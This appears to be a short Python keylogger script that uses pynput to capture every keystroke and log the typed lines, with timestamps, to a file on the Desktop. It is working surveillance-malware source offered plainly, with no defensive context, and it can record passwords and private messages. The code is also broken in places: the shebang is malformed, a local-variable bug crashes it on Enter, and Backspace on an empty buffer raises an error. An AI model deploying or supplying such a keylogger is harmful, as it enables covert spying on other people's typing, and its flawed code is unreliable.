#!/bin/bash/env python
# coding=UTF-8
from pynput.keyboard import Key, Listener
import logging
import os

log_dir = os.environ['HOME'] + '/Desktop/'
logging.basicConfig(filename = (log_dir + 'key_log.txt'), level=logging.DEBUG, format = '%(asctime)s: %(message)s')

lista = []
string=''
def on_press(key):
    if(str(key) == 'Key.space'):
        key = ' '
    if(str(key) == 'Key.enter'):
        key ='\n'
        print('\n\n' + string + '\n\n')
    if(str(key) == 'Key.backspace'):
        key = ''
        lista.pop()
    string = ''.join(lista)
    lista.append(str(key).replace("u'",'').replace("'",''))
    if(str(key) == '\n'):
        logging.info(string)
        string = ''

with Listener(on_press=on_press) as listener:
    listener.join()
